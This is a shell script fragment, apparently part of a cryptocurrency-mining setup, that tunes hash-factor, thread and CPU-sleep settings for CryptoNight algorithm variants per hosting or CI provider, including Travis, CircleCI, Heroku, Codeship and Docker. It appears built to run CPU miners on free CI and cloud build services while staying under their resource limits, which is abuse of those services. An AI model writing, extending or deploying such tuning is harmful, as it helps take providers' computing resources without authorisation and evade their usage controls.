## tuning for third party services

tune_thirdparty() {
    local base threads provider
    export mhf=$cMhf csleep=$CSLEEP
    provider=${X_ID/-*}
    if type "$provider"; then
        log "tune_thirdparty - provider: $provider"
        $provider
    else
        log "no provider available skipping 3rd party tuning"
        return
    fi

    cMhf=${mhf:-$cMhf}
    cThr=${threads:-$cThr}
    ## use change config to override MHF_FIXED
    change_config hash-factor "$cMhf"
    change_config threads "$cThr"
    [ "$csleep" != "$CSLEEP" ] && CSLEEP=$csleep && change_config cpu-sleep $CSLEEP
}

travis() {
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=2
            threads=2
            ;;
        "cn-pico")
            mhf=4
            threads=2
            ;;
    esac
}

bitrise() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=1
            ;;
        "cn-pico")
            mhf=4
            threads=2
            ;;
    esac
}

circleci() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=1
            ;;
        "cn-pico")
            mhf=5
            threads=1
            ;;
    esac
}

codefresh() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=2
            threads=2
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;
        "cn-pico")
            mhf=5
            threads=3
            ;;
    esac
}

codeship() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            CSLEEP=10000
            ;;
        "cn")
            mhf=2
            threads=4
            CSLEEP=5000
            ;;
        "cn-lite")
            mhf=4
            threads=4
            CSLEEP=2000
            ;;
        "cn-pico")
            mhf=5
            threads=4
            CSLEEP=1000
            ;;
    esac
}

cphp() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=1
            ;;
        "cn-pico")
            mhf=5
            threads=2
            ;;
    esac
}

docker(){
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=1
            ;;
        "cn-pico")
            mhf=5
            threads=1
            ;;
    esac
}

quay() {
        case "$job_algo" in
            "cn-heavy")
                mhf=1
                threads=2
                ;;
            "cn")
                mhf=2
                threads=4
                ;;
            "cn-lite")
                mhf=3
                threads=2
                ;;
            "cn-pico")
                mhf=5
                threads=2
                ;;
        esac
}

drone() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=2
            threads=4
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;
        "cn-pico")
            mhf=5
            threads=2
            ;;
    esac
}

semaphore() {
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=2
            ;;
        "cn")
            mhf=1
            threads=4
            ;;
        "cn-lite")
            mhf=2
            threads=4
            ;;
        "cn-pico")
            mhf=5
            threads=4
            ;;
    esac
}

wercker() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=3
            threads=4
            ;;
        "cn-lite")
            mhf=4
            threads=4
            ;;
        "cn-pico")
            mhf=5
            threads=4
            ;;
    esac
}

appv() {
    {
        case "$job_algo" in
            "cn-heavy")
                mhf=3
                threads=1
                csleep=75000
                ;;
            "cn")
                mhf=3
                threads=2
                csleep=50000
                ;;
            "cn-lite")
                mhf=4
                threads=2
                csleep=30000
                ;;
            "cn-pico")
                mhf=5
                threads=2
                csleep=20000
                ;;
        esac
    }
}

heroku() {
        case "$job_algo" in
            "cn-heavy")
                mhf=1
                threads=1
                ;;
            "cn")
                mhf=2
                threads=2
                ;;
            "cn-lite")
                mhf=3
                threads=2
                ;;
            "cn-pico")
                mhf=5
                threads=2
                ;;
        esac
}

oc() {
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=2
            ;;
        "cn")
            mhf=2
            threads=2
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;
        "cn-pico")
            mhf=5
            threads=2
            ;;
    esac
}
